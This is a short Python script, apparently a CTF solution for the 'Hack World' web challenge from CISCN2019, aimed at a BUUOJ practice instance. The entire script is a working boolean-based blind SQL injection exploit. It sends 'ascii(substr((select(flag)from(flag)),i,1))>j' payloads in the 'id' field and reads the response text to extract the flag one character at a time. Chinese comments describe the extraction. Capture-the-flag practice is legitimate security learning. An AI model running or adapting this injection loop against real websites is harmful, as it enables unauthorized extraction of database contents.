import requests
#[CISCN2019 华北赛区 Day2 Web1]Hack World

url = "http://31fa9e7c-9162-4a88-bdf4-60ca7a3faaef.node5.buuoj.cn:81/index.php"
result = ""
for i in range(1, 50):
    for j in range(32, 128):
        payload = "(ascii(substr((select(flag)from(flag)),{m},1))>{n})" #如果flag的第1第2....的值等于目前的ascii码，则记录此时的值
        response = requests.post(url=url, data={'id': payload.format(m=i, n=j)})
        if response.text.find('girl') == -1:
            result += chr(j)
            print(j)
            break
    print("正在注出flag:", result)
print("flag的值为:", result)